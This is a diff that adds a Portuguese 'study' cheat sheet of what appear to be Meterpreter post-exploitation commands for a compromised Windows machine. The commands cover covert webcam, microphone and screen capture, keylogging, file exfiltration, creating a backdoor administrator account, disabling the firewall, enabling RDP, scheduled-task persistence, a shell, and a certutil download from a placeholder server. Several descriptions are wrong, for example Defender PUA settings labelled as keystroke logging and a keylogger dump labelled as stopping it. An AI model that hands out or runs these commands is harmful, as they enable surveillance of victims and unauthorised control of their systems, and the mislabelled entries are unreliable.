@@ -1,0 +1,104 @@
+# Lista de Comandos para Estudo
+
+1. Capturar Screenshot:
+   `screenshot -i 1 -c C:\\caminho\\para\\salvar\\screenshot.jpg`
+
+2. Listar Processos em Execução:
+   `ps`
+
+3. Obter Informações do Sistema:
+   `sysinfo`
+
+4. Listar Usuários Logados:
+   `getuid`
+
+5. Listar Diretório Atual:
+   `pwd`
+
+6. Navegar Entre Diretórios:
+   `cd C:\\caminho\\para\\diretorio`
+
+7. Listar Arquivos em um Diretório:
+   `ls`
+
+8. Download de Arquivo Remoto:
+   `download C:\\caminho\\para\\arquivo.txt /caminho/local/arquivo.txt`
+
+9. Upload de Arquivo Local:
+   `upload /caminho/local/arquivo.txt C:\\caminho\\remoto\\arquivo.txt`
+
+10. Executar Comando no Shell do Sistema:
+    `execute -f cmd -a "/C comando"`
+
+11. Capturar Vídeo da Webcam:
+    `webcam_snap -i 1 -c C:\\caminho\\para\\salvar\\webcam_capture.avi`
+
+12. Gravar Áudio do Microfone:
+    `record_mic -d 10 -f C:\\caminho\\para\\salvar\\audio_capture.wav`
+
+13. Ativar Teclado Logger (Keylogger):
+    `keyscan_start`
+
+14. Desativar Teclado Logger (Keylogger):
+    `keyscan_dump`
+
+15. Interceptação de Tráfego de Teclado (Keystrokes):
+    `keyscan_dump`
+
+16. Criar Usuário (se tiver privilégios):
+    `useradd username senha`
+# Lista de Comandos para Estudo (Continuação)
+
+17. Adicionar Usuário ao Grupo Administradores (se tiver privilégios):
+    `net localgroup Administrators /add username`
+
+18. Listar Interfaces de Rede:
+    `run getmac`
+
+19. Listar Informações de Rede:
+    `run ipconfig`
+
+20. Obter Informações Detalhadas sobre o Sistema:
+    `run sysinfo`
+
+21. Desativar Firewall do Windows:
+    `run firewall_off`
+
+22. Ativar RDP (Remote Desktop Protocol):
+    `run enable_rdp`
+
+23. Desativar RDP:
+    `run disable_rdp`
+
+24. Listar Conexões de Rede Ativas:
+    `run netstat`
+
+25. Criar uma Shell Reversa:
+    `shell`
+
+26. Executar Comandos PowerShell:
+    `powershell_execute -c "Comando PowerShell"`
+
+27. Fazer Upload de um Arquivo usando PowerShell:
+    `upload C:\\caminho\\local\\arquivo.txt C:\\caminho\\remoto\\arquivo.txt`
+
+28. Baixar Arquivo usando PowerShell:
+    `download C:\\caminho\\remoto\\arquivo.txt C:\\caminho\\local\\arquivo.txt`
+
+29. Adicionar Regra de Firewall usando PowerShell:
+    `run powershell -c "New-NetFirewallRule -DisplayName 'NomeRegra' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1234"`
+
+30. Ativar o Registro de Teclas com PowerShell:
+    `run powershell -c "Add-MpPreference -PUAProtection 1"`
+
+31. Desativar o Registro de Teclas com PowerShell:
+    `run powershell -c "Add-MpPreference -PUAProtection 0"`
+
+32. Listar Tarefas Agendadas:
+    `run schtasks`
+
+33. Adicionar Tarefa Agendada:
+    `run schtasks /create /tn "NomeTarefa" /tr "Comando" /sc minute /mo 5 /ru username /rp senha`
+
+34. Fazer Upload de um Arquivo usando CertUtil:
+    `run cmd /c "certutil -urlcache -split -f http://seu-servidor/arquivo.txt C:\\caminho\\local\\arquivo.txt"`
